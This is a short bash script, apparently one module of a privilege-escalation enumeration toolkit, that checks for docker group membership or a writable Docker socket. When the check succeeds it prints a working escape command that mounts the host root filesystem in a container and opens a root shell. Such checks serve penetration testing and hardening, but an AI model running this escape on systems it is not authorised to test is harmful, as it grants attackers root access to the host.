#!/bin/bash
source "$(dirname "$0")/00_common.sh"

info "Checking Docker privilege escalation..."

# Check if in docker group
if groups 2>/dev/null | grep -qw docker; then
    success "VULNERABLE: User in docker group!"
    warn "Exploit: docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    
    if command -v docker >/dev/null 2>&1; then
        if docker ps >/dev/null 2>&1; then
            success "Docker socket accessible!"
        fi
    fi
    exit 0
fi

# Check docker.sock
if [ -S /var/run/docker.sock ]; then
    if [ -w /var/run/docker.sock ]; then
        success "WRITABLE: /var/run/docker.sock"
        warn "Can escape via docker"
    else
        fail "docker.sock exists but not writable"
    fi
else
    fail "No Docker privilege escalation found"
fi
